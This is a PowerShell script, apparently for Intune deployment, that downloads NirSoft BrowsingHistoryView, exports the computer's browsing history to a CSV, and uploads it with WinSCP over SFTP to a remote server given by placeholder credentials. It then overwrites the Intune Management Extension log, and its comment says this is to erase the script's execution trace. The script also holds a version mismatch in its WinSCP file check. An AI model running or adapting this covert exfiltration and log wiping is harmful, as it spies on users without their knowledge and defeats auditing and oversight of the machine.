$computername = $env:computername
$path=$env:TEMP

if (-not(Test-Path -Path $path\browsinghistoryview-x64.zip -PathType Leaf)){
Invoke-WebRequest -Uri 'https://www.nirsoft.net/utils/browsinghistoryview-x64.zip' -OutFile $path\browsinghistoryview-x64.zip -Verbose *> $path\Downloadlog.text

#Extract the zip file which is downloaded to the temp folder
Expand-Archive  -LiteralPath "$path\browsinghistoryview-x64.zip" -DestinationPath $path -Force -Verbose *> $path\Expandlog.text

}

# dump the browsing history views to a .csv file
$Arguments = "/scomma $path\$computername.csv", '/sort "~Visit Time"'
Start-Process -FilePath $path\BrowsingHistoryView.exe -ArgumentList $Arguments -Wait

#download WinSCP, it's needed to make sftp connections from windows computers
if (-not(Test-Path -Path $path\WinSCP-5.19.1-Automation.zip -PathType Leaf)){

Invoke-WebRequest -Uri 'https://winscp.net/download/WinSCP-5.21.5-Automation.zip' -OutFile $path\WinSCP-5.21.5-Automation.zip -Verbose *> $path\Downloadlog.text

#Extract the zip file which is downloaded to the temp folder, to the temp folder
Expand-Archive  -LiteralPath "$path\WinSCP-5.21.5-Automation.zip" -DestinationPath $path -Force -Verbose *> $path\Expandlog.text

}

# Load WinSCP .NET assembly
Add-Type -Path $path\WinSCPnet.dll

  # Setup session options
  # the informations needed to connect to your remote sftp server
$sessionOptions = New-Object WinSCP.SessionOptions -Property @{
    Protocol = [WinSCP.Protocol]::Sftp
    HostName = "xxxx"
    PortNumber = 0000
    UserName = "xxxxx"
    Password = "xxxxxxxxxxxxxxxxxx"
    SshHostKeyFingerprint = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}

$session = New-Object WinSCP.Session

try
{
    # Connect
    $session.Open($sessionOptions)

    # Upload the dumped files to /ftpuser-Files directory on the remote server 
    $session.PutFiles("$path\$computername.csv", "/ftpuser-Files/").Check()
}
finally
{
    # Disconnect, clean up
    $session.Dispose()
}

# remove the script execution trace from Intune Log on the system
$IntuneLog = Get-Content -Path C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\IntuneManagementExtension.log
$IntuneLog = ""
$IntuneLog | Out-File -FilePath C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\IntuneManagementExtension.log -Force
